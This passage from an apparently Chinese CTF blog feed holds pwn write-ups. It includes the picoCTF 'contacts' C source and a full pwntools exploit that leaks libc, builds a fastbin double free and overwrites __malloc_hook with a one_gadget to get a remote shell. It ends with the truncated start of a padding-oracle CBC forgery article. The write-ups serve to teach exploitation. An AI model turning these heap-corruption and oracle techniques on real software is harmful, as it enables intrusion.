class="string">'system'</span>]</span><br><span class="line">shellstr = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">menu(<span class="number">5</span>)</span><br><span class="line">harden(<span class="number">0</span>,<span class="number">32</span>,<span class="string">'a'</span>*<span class="number">8</span>+p64(shellstr)+p64(sys_addr))</span><br><span class="line"><span class="comment"># free</span></span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># create</span></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">menu(<span class="number">6</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># 0</span></span><br><span class="line"><span class="comment"># cat flag.txt</span></span><br></pre></td></tr></table></figure></p><h3><span id="picocontacts">pico——contacts</span></h3><p>这题我倒是研究了很久，虽然源码没有sword长，但是利用手段要复杂一些。<strong>第一步</strong>一样利用fastbin特性泄露地址，因为bio是任意写的，写好内容后free再构造好malloc出来到name上，泄露__libc_start_main地址。<strong>后面的想法</strong>很自然是找到system地址然后想办法把free的got内容改了，调用delete_contact，把name或者bio的内容写成’/bin/sh’.但是当时不知道size check，后面报错了才发现这个坑。<strong>改为利用malloc_hook</strong>,找main_arena就花了半天劲，发现可能开了PIE就没符号了，载入源码也不成。搞了半天，后来想到如果是同一个libc，就算偏移不一样，但是如果存在0x0000000007f的数据，那么这个数据离malloc_hook或者离main_arena的距离肯定是一定的。所以自己随便写了个带malloc的代码用gdb找到了这块位置，得出偏移是35.<strong>最后一个卡住的地方：</strong>用fgets读101个字节的时候读不进去，不知道是堆上的保护还是什么情况，后面单不调试到这里发现没有读进去东西，因为malloc一个0x70大小的chunk有一个范围，改小一点之后可以写入成功，所以就构造出了double free的循环链表。<strong>写one_gadget地址的时候</strong>，有时会失败，那自然是条件没有满足，换一个继续就好。</p><h4><span id="题目">题目</span></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_CONTACTS 16</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">contact</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">char</span> *bio;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">contact</span> *<span class="title">contacts</span>[<span class="title">MAX_CONTACTS</span>];</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_contacts = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_contacts</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num_contacts; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (contacts[i]-&gt;bio != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s - %s\n"</span>, contacts[i]-&gt;name, contacts[i]-&gt;bio);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s - (No bio)\n"</span>, contacts[i]-&gt;name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct contact *<span class="title">find_contact</span><span class="params">(<span class="keyword">char</span> *name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num_contacts; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, contacts[i]-&gt;name))&#123;</span><br><span class="line">            <span class="keyword">return</span> contacts[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_contact</span><span class="params">(<span class="keyword">char</span> *name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num_contacts == MAX_CONTACTS)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Too many contacts! Delete one first!"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">contact</span> *<span class="title">contact</span> = (<span class="title">struct</span> <span class="title">contact</span> *)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">contact</span>));</span></span><br><span class="line">    <span class="keyword">if</span> (contact == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Could not allocate new contact."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* make a copy of the name on the heap */</span></span><br><span class="line">    contact-&gt;name = strdup(name);</span><br><span class="line">    <span class="keyword">if</span> (contact-&gt;name == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Could not duplicate name."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    contacts[num_contacts++] = contact;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_contact</span><span class="params">(struct contact *contact)</span></span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(contact-&gt;name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* if the bio is set, free it as well */</span></span><br><span class="line">    <span class="keyword">if</span> (contact-&gt;bio != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">free</span>(contact-&gt;bio);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(contact);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* replace the corresponding index with the last contact and decrement num_contacts */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num_contacts; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (contacts[i] == contact)&#123;</span><br><span class="line">            contacts[i] = contacts[num_contacts - <span class="number">1</span>];</span><br><span class="line">            num_contacts--;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_bio</span><span class="params">(struct contact *contact)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> input[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">size_t</span> length;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* we'll replace the old bio */</span></span><br><span class="line">    <span class="keyword">if</span> (contact-&gt;bio != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">free</span>(contact-&gt;bio);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"How long will the bio be?"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fgets(input, <span class="number">4</span>, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Couldn't read length."</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    length = strtoul(input, <span class="literal">NULL</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> (length &gt; <span class="number">255</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Bio must be at most 255 characters."</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    contact-&gt;bio = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(length+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (contact-&gt;bio == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Couldn't allocate bio."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Enter your new bio:"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fgets(contact-&gt;bio, length+<span class="number">1</span>, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Couldn't read bio."</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Bio recorded."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Available commands:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\tdisplay - display the contacts"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\tcreate [name] - create a new contact"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\tdelete [name] - delete an existing contact"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\tbio [name] - set the bio for an existing contact"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\tquit - exit the program"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">process_cmd</span><span class="params">(<span class="keyword">char</span> *cmd)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">contact</span> *<span class="title">contact</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(cmd, <span class="string">"display"</span>, <span class="number">7</span>))&#123;</span><br><span class="line">        print_contacts();</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(cmd, <span class="string">"create"</span>, <span class="number">6</span>))&#123;</span><br><span class="line">        name = strtok(&amp;cmd[<span class="number">7</span>], <span class="string">"\n"</span>);</span><br><span class="line">        <span class="keyword">if</span> (name == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Invalid command"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        create_contact(name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Created contact \"%s\"\n"</span>, name);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(cmd, <span class="string">"delete"</span>, <span class="number">6</span>))&#123;</span><br><span class="line">        name = strtok(&amp;cmd[<span class="number">7</span>], <span class="string">"\n"</span>);</span><br><span class="line">        <span class="keyword">if</span> (name == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Invalid command"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        contact = find_contact(name);</span><br><span class="line">        <span class="keyword">if</span> (contact == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Can't find contact"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        delete_contact(contact);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Deleted contact \"%s\"\n"</span>, name);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(cmd, <span class="string">"bio"</span>, <span class="number">3</span>))&#123;</span><br><span class="line">        name = strtok(&amp;cmd[<span class="number">4</span>], <span class="string">"\n"</span>);</span><br><span class="line">        <span class="keyword">if</span> (name == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Invalid command"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        contact = find_contact(name);</span><br><span class="line">        <span class="keyword">if</span> (contact == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Can't find contact"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        set_bio(contact);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(cmd, <span class="string">"quit"</span>, <span class="number">4</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid option"</span>);</span><br><span class="line">        menu();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">command_loop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"\nEnter your command:"</span>);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">'&gt;'</span>); <span class="built_in">putchar</span>(<span class="string">' '</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(fgets(buf, <span class="number">512</span>, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (process_cmd(buf))&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    <span class="comment">/* Don't buffer stdout. */</span></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    command_loop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="writeup">writeup</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">elf = ELF(&apos;./contacts&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">p = remote(sys.argv[1],sys.argv[2])</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">name = &apos;a&apos;*8+p64(elf.got[&apos;__libc_start_main&apos;])</span><br><span class="line">p.sendline(&apos;create &apos;+ name)</span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">p.sendline(&apos;bio &apos;+ name)</span><br><span class="line">p.recvuntil(&apos;be?\n&apos;)</span><br><span class="line">p.sendline(&apos;16&apos;)</span><br><span class="line">p.recvuntil(&apos;bio:\n&apos;)</span><br><span class="line">p.sendline(&apos;this is my bioh&apos;)</span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;delete &apos; + name)</span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">p.sendline(&apos;create name1&apos;)</span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">p.sendline(&apos;create name2&apos;)</span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">p.sendline(&apos;display&apos;)</span><br><span class="line">p.recvuntil(&apos;name2 - &apos;)</span><br><span class="line">_libc_start_main_addr = u64(p.recvuntil(&apos;\n&apos;)[:-1] + &apos;\x00&apos; + &apos;\x00&apos;)</span><br><span class="line">libc_base = _libc_start_main_addr - libc.symbols[&apos;__libc_start_main&apos;]</span><br><span class="line">sys_addr = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">print libc_base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">inject_point = malloc_hook - 35</span><br><span class="line">print inject_point</span><br><span class="line">one_gadget = libc_base + 0x4526a</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">p.sendline(&apos;create name3&apos;)</span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">p.sendline(&apos;create name4&apos;)</span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">p.sendline(&apos;bio name4&apos;)</span><br><span class="line">p.recvuntil(&apos;be?\n&apos;)</span><br><span class="line">p.sendline(&apos;100&apos;)</span><br><span class="line">p.recvuntil(&apos;bio:\n&apos;)</span><br><span class="line">p.sendline(&apos;4&apos;*99)</span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">p.sendline(&apos;bio name3&apos;)</span><br><span class="line">p.recvuntil(&apos;be?\n&apos;)</span><br><span class="line">p.sendline(&apos;100&apos;)</span><br><span class="line">p.recvuntil(&apos;bio:\n&apos;)</span><br><span class="line">p.sendline(&apos;7&apos;*99)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">p.sendline(&apos;bio name4&apos;)</span><br><span class="line">p.recvuntil(&apos;be?\n&apos;)</span><br><span class="line">p.sendline(&apos;666&apos;)</span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">p.sendline(&apos;bio name3&apos;)</span><br><span class="line">p.recvuntil(&apos;be?\n&apos;)</span><br><span class="line">p.sendline(&apos;666&apos;)</span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">p.sendline(&apos;delete name4&apos;)</span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;create name5&apos;)</span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">p.sendline(&apos;create name7&apos;)</span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">print &apos;name7&apos;</span><br><span class="line">pause()</span><br><span class="line">p.sendline(&apos;bio name7&apos;)</span><br><span class="line">p.recvuntil(&apos;be?\n&apos;)</span><br><span class="line">p.sendline(&apos;89&apos;)</span><br><span class="line">p.recvuntil(&apos;bio:\n&apos;)</span><br><span class="line">p.sendline(p64(inject_point))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">p.sendline(&apos;create &apos; + &apos;8&apos;*100)</span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">p.sendline(&apos;create &apos; + &apos;9&apos;*100)</span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">p.sendline(&apos;create name11&apos;)</span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">p.sendline(&apos;bio name11&apos;)</span><br><span class="line">p.recvuntil(&apos;be?\n&apos;)</span><br><span class="line">p.sendline(&apos;89&apos;)</span><br><span class="line">p.recvuntil(&apos;bio:\n&apos;)</span><br><span class="line">p.sendline(&apos;a&apos;*19 + p64(one_gadget))</span><br><span class="line">p.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">p.sendline(&apos;create getshell&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>padding oracle attack</title>
      <link href="/2019/04/02/padding-oracle-attack/"/>
      <url>/2019/04/02/padding-oracle-attack/</url>
      
        <content type="html"><![CDATA[<h2><span id="写在前面">写在前面</span></h2><blockquote><p>是pico上的一个题目，一般的padding oracle是破解密文，pico上的这个是利用padding oracle在IV可控的情况下构造任意明文的对应密文<br><a id="more"></a></p></blockquote><h2><span id="padding-oracle">Padding Oracle</span></h2><p>网上相关的文章特别多，有一个我觉得介绍的特别好的，顺便还提到了cbc翻转攻击。<a href="https://skysec.top/2017/12/13/padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">padding oracle</a></p><h3><span id="cbc-encryption">CBC Encryption</span></h3><p><img src="/assets/img/padding/enc.png" alt="enc"></p><h3><span id="cbc-decryption">CBC Decryption</span></h3><p><img src="/assets/img/padding/dec.png" alt="dec"></p><h3><span id="padding-pcks7">padding pcks7</span></h3><p>如果按照16字节一块，那么最后一块不满足16字节的时候，假设差6块刚好填满16字节，那么padding就是<code>6*&#39;\x06&#39;</code>,而padding oracle就是发给他一密文，oracle判断这个密文是否合法。如果解密出来的padding有误，那么会告诉你padding error.</p><h3><span id="构造任意密文">构造任意密文</span></h3><p>现在任意拿一块密文，利用padding oracle可以得到另一个密文,(因为就两块就把这个得到的叫做iv)和这个密文解密出来的padding刚好是<code>16*&#39;\x10&#39;</code>,假设我需要的密文的最后一块需要解密出来要为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">success\x09\x09\x09\x09\x09\x09\x09\x09\x09</span><br></pre></td></tr></table></figure></p><p>那么根据<code>iv ^ middle=16*&#39;\x10&#39;</code>,<code>iv&#39; ^ middle = &#39;success\x09\x09\x09\x09\x09\x09\x09\x09\x09&#39;</code><br>可以得到我们构造出的新的iv’应该要为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iv<span class="string">' = "success\x09\x09\x09\x09\x09\x09\x09\x09\x09" ^ 16*"\x10" ^ 